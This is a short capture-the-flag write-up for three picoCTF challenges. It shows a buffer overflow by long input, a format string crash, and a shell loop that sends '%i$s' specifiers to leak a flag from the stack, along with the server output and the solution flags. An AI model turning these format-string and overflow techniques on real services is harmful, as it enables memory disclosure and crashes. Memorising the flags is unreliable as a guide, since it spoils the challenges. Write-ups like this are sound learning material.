## Buffer overflow 0

This was a really simple challenge which only required me to find a way to smash the stack, ergo, buffer overflow. The program given in the challenge would basically print out the flag if there was a segmentation fault which would happen if we spammed the input with any character

<br/>
Used the server connection : nc saturn.picoctf.net 57100

```
srinidhia@srinidhis-mbp ~ % nc saturn.picoctf.net 57100
Input: OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
OOOOOOOOOOOOOOOOOOOOOOOOOOO
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

The flag : picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}

****

## Format String 0

I used the same principle as before
```
srinidhia@srinidhis-mbp ~ % nc mimas.picoctf.net 51547
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: ggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg
gggggggggggggggggggggggggggggggggggggggggggg
There is no such burger yet!

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}
```

The flag : picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}

****

## Flag leak

```
srinidhia@srinidhis-mbp ~ % for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 49843; done
```
The above line written basically is to print the string value(%s) from the address which we get from the index(i.e;i). We're then piping the server connection.

Output :
```
Tell me a story and then I'll tell you one >> Here's a story -
%0$s
Tell me a story and then I'll tell you one >> Here's a story -
%1$s
Tell me a story and then I'll tell you one >> Here's a story -
a2�
Tell me a story and then I'll tell you one >> Here's a story -
�ú,
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
/
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
�.
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
�������
Tell me a story and then I'll tell you one >> Here's a story -
�(��gM,�gM,�gM,�gM,�gM,�gM,�gM,�hM,�
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
setresgid
Tell me a story and then I'll tell you one >> Here's a story -
��,�
Tell me a story and then I'll tell you one >> Here's a story -
��e�

Tell me a story and then I'll tell you one >> Here's a story -
setresgid
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
Tell me a story and then I'll tell you one >> Here's a story -
�Z��
Tell me a story and then I'll tell you one >> Here's a story -
ii
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
ii
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
$�
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
�(��g���g���g���g���g���g���g���h���
Tell me a story and then I'll tell you one >> Here's a story -
����������؉ǀ�u��^H�C�p��s��u��C
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
^C%
```
Amidst this, I got a significant part of the flag and after a while I just exited the long loop.
<br/>
<br/>

CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}

<br/>
The flag : picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
